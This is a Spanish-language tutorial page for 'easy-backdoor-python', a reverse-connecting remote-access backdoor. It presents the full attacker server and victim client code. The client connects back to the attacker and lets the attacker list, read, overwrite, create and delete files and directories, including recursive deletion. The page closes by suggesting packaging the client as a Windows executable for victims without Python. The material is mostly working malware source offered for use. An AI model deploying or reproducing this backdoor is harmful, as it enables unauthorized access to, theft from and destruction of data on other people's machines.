---
layout: default
---

# easy-backdoor-python

Esta es una herramienta muy sencilla que puede servir como backdoor usando sockets en python.

[Link a la herramienta en Github.](https://github.com/dTowersss/easy-python-backdoor)

## Cómo funciona el backdoor 

### El servidor

Primero de todo se importan las librerías que harán falta para el programa y luego se declaran las dos variables principales. La variable `IP` en la que deberás meter la ip de la máquina servidor/atacante y la variable `PORT` donde deberás meter el puerto por el que quieras que se conecte la víctima.  

```python
import socket
import threading
import sys
import os
IP = "Your IP"
PORT = 9112
```
Después se declara la función main donde crearemos un socket con `socket.socket(socket.AF_INET, socket.SOCK_STREAM)` y nos quedaremos escuchando hasta que haya una conexión.

```python 
def main(): 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f'[*]Esperando por conexiones en {IP}:{PORT}')
```
Ahora dentro de la misma función hacemos un bucle que se repetirá hasta el infinito donde aceptaremos la conexión con `client, address = server.accept()` , es necesario poner `client` y poner `adress` o podría dar fallos.
Después iniciamos un hilo con un párametro que apunta a otra función que se ejecutará a la vez que la principal.

```python
client_handler = threading.Thread(target=handle_client, args=(client,))
client_handler.start()
```
Definimos la función a la que dirigirá los comandos que mandamos.
```python
def handle_client(client_socket):
    with client_socket as sock:
```
Y creamos otro bucle infinito. Aquí también he definido otra pequeña función para limpiar la pantalla. Además añadimos un input que recogerá el comando que queramos mandar.

```python
while True:
            def borrarPantalla():
                os.system ("clear")
	    comando = input("$->  ")
```
Ahora hay que determinar todos los comandos que se van a poder mandar al cliente.

En los dos primeros se establece una condición de que si se envia `exit` o `help` se cierre la aplicación o aparezca el menú de ayuda respectivamente.

```python
if comando == "exit":
                print("[*]Conexión Cerrada")
                command = comando.encode()
                sock.send(command)
                sys.exit(1)
elif comando == "help":
                print("Comandos a usar: pwd, cls, read, mkdir, rd, rm, write, touch, sys, cd, ls, cd.., exit.")
```
Luego le digo al programa si el comado esta vacío le envíe al cliente el string `empty` y si el comando es `cls` que se limpie la pantalla.

```python
elif comando == "":
   	command = comando + 'empty'
   	command1 = command.encode()
   	sock.send(command1)
   	request = sock.recv(4096)
   	print(request.decode("utf-8"))
elif comando == "cls":
   	borrarPantalla()
```
Después se declaran dos condiciones las cuales determinan los comandos `write` y `touch` los cuales reescriben un archivo o crean uno nuevo respectivamente y le añaden texto dentro.

```python
elif comando[:5] == "write":
                command = comando.encode()
                sock.send(command)
                archivo = input("Que deseas poner en el archivo: ")
                archivos =  archivo.encode()
                sock.send(archivos)
                request = sock.recv(4096)
                print(request.decode("utf-8"))
            
elif comando[:5] == "touch":
                command = comando.encode()
                sock.send(command)
                archivo = input("Que deseas poner en el archivo: ")
                archivos =  archivo.encode()
                sock.send(archivos)
                request = sock.recv(4096)
                print(request.decode("utf-8"))
```
Y por último si no se introduce ningún comando de los anteriores se envía al cliente para que este lo rechaze. Y además se inicia la función `main()`

```python
else:
     command = comando.encode()
     sock.send(command)
     request = sock.recv(4096)
     print(request.decode("utf-8")) 

if __name__ == "__main__":
    main()
```
### El cliente

Al igual que en el servidor se importan las librerías oportunas y se declaran las dos variables `ip` y `port` las cuales tienen que ser iguales que las del servidor.

``` python
import socket
import os 
import sys
import shutil

ip = "Your IP"
port = 9112
```
Después se crear la conexión al servidor el cuál tiene que estar escuchando antes de ejecutar el cliente.

```python 
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip, port))
```
Ahora se crea un bucle infinito y se declara una variable que recibirá los comandos del servidor.

```python
while True:
    response = client.recv(4096)
```
Hecho esto se declaran todos los comandos que pueden llegar y se consigue la información del cliente a través de sentencias de las distintas líbrerias anteriormente importadas. Y luego se envian los datos de vuelta a servidor.

```python
if response.decode() == "pwd":
        ruta = os.getcwd()
        path = ruta.encode()
        client.send(path)

elif response.decode() == "sys":
        sistem = sys.platform
        sistema = sistem.encode()
        client.send(sistema)

elif response.decode() == "ls":
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)

elif response.decode() == "cd ..":
        os.chdir("../")
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)
    
elif response.decode()[:2] == "cd":
        os.chdir(response.decode()[3:])
        result = os.getcwd()
        path = result.encode()
        client.send(path)

elif response.decode()[:5] == "mkdir":
        os.mkdir(response.decode()[6:])
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)

elif response.decode()[:2] == "rm":
        os.remove(response.decode()[3:])
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)
    
elif response.decode()[:2] == "rd":
        shutil.rmtree(response.decode()[3:])
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)
        
elif response.decode()[:5] == "write":
        f = open (response.decode()[6:],'w')
        response = client.recv(4096)
        f.write(response.decode())
        f.close()
        client.send(bytes("Archivo reescrito", "utf-8"))

 elif response.decode()[:5] == "touch":
        f = open (response.decode()[6:],'w')
        response = client.recv(4096)
        f.write(response.decode())
        f.close()
        client.send(bytes("Archivo creado y escrito\n", "utf-8"))
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)

 elif response.decode()[:4] == "read":
        f = open(response.decode()[5:])
        file = f.read()
        files = bytes(file, "utf-8")
        client.send(files)
```
En algunos casos es necesario convertir objetos a strings y luego esos strings a bytes para poder enviarlos.

Y por último se declaran las últimas condiciones que cubren las situaciones en las que el comando sea un exit que este vacío o que este mal escrito.

```python
 elif response.decode() == "exit":
        sys.exit(1)
    
 elif response.decode() == "empty":
        client.send(bytes('No has elegido ningún comando', "utf-8"))
    
 else:
        client.send(bytes('El comando está mal escrito', "utf-8"))
```
Y esto sería todo el funcionamiento del backdoor en python. Si se quisiera usar en un Windows sin python instalado se podría convertir el client.py en un ejecutable con herramientas como [auto-py-to-exe.](https://github.com/brentvollebregt/auto-py-to-exe)


```
